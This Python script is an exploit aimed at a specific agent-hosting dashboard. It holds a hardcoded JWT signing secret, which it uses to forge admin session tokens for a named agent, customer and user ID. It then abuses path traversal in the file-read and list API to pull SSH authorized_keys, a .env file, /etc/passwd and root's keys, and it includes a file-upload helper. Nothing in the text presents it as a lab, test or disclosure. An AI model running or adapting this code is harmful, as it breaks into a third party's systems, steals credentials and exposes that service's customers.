#!/usr/bin/env python3
# i29311 phase3: test /.lumii-agent-keeper/ local branch on Brian agent-047f1d22
import os, sys, json, base64, hmac, hashlib, subprocess, random
import urllib.parse as up
HOST = "dashboard.lumiiai.cn"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
JWT_SECRET = "w2I+OOqT9vkI12T3bNGwNp/2EA/L2H1ecwnWwA7UZ6A="
def _b64(s): return base64.b64encode(s.encode("utf-8", "replace")).decode()
def R(k, v):
    s = v if isinstance(v, str) else json.dumps(v, ensure_ascii=False, default=str)
    print("R:%s:%s" % (k, _b64(s)), flush=True)
def sh(a, timeout=90):
    try:
        r = subprocess.run(a, capture_output=True, timeout=timeout); return r.returncode, r.stdout.decode("utf-8","replace"), r.stderr.decode("utf-8","replace")
    except Exception as e: return -1, "", repr(e)
def curl(args, timeout=40): return sh(["curl","-s","-k","-m",str(timeout)]+args, timeout=timeout+15)
def b64u(b):
    if isinstance(b,str): b=b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
def forge(p):
    h=b64u(json.dumps({"alg":"HS256","typ":"JWT"},separators=(",",":"))); pl=b64u(json.dumps(p,separators=(",",":")))
    return h+"."+pl+"."+b64u(hmac.new(JWT_SECRET.encode(),(h+"."+pl).encode(),hashlib.sha256).digest())
def tok_for(uid,cust): return forge({"userId":uid,"email":"probe@x","customer":cust,"role":"admin"})
def call(path,cookie,timeout=30,maxlen=200000):
    a=["--http2","-A",UA,"-H","Accept: application/json","-H","Cookie: session="+cookie,"-w","\n__CODE__%{http_code}","https://%s%s"%(HOST,path)]
    rc,out,err=curl(a,timeout=timeout); i=out.rfind("__CODE__"); code=""; txt=out
    if i>=0: code=out[i+8:].strip()[:3]; txt=out[:i]
    return {"code":code,"body":txt[:maxlen]}
def files_read(aid,path,tok,maxlen=30000): return call("/api/agents/%s/files?action=read&path=%s"%(aid,up.quote(path,safe="/")),tok,maxlen=maxlen)
def files_list(aid,path,tok,maxlen=30000): return call("/api/agents/%s/files?action=list&path=%s"%(aid,up.quote(path,safe="/")),tok,maxlen=maxlen)
def upload(aid,tok,path,name,content,timeout=60):
    tmp="/tmp/u_%d"%random.randint(1000,999999); open(tmp,"wb").write(content.encode() if isinstance(content,str) else content)
    url="https://%s/api/agents/%s/files/upload?path=%s"%(HOST,aid,up.quote(path,safe="/"))
    rc,out,err=curl(["--http2","-A",UA,"-H","Cookie: session="+tok,"-w","\n__CODE__%{http_code}","-F","files=@%s;filename=%s"%(tmp,name),url],timeout=timeout)
    i=out.rfind("__CODE__"); code=""; txt=out
    if i>=0: code=out[i+8:].strip()[:3]; txt=out[:i]
    return {"code":code,"body":txt[:600]}

def test(AID, CUST, AUID, tag):
    TOK = tok_for(AUID, CUST)
    for pth in ["/home/lumii/.lumii-agent-keeper/../.ssh/authorized_keys",
                "/home/coder/.lumii-agent-keeper/../.ssh/authorized_keys",
                "/home/lumii/.lumii-agent-keeper/../.env.dev",
                "/home/lumii/.lumii-agent-keeper/../../etc/passwd",
                "/home/lumii/.lumii-agent-keeper/../../root/.ssh/authorized_keys"]:
        R(tag+"_r_"+pth.replace("/","_")[:60], files_read(AID,pth,TOK,maxlen=3000))
    R(tag+"_list_keeper", files_list(AID,"/home/lumii/.lumii-agent-keeper/",TOK,maxlen=2000))
    R(tag+"_list_home", files_list(AID,"/home/lumii/.lumii-agent-keeper/../",TOK,maxlen=3000))
    R(tag+"_list_coder", files_list(AID,"/home/coder/.lumii-agent-keeper/../",TOK,maxlen=3000))

def main():
    test("agent-047f1d22","aro","fc7c3730-4219-11f1-ac43-525400595be1","BRIAN")
try: main()
except Exception:
    import traceback; R("FATAL", traceback.format_exc()[-3000:])
finally: sys.exit(0)
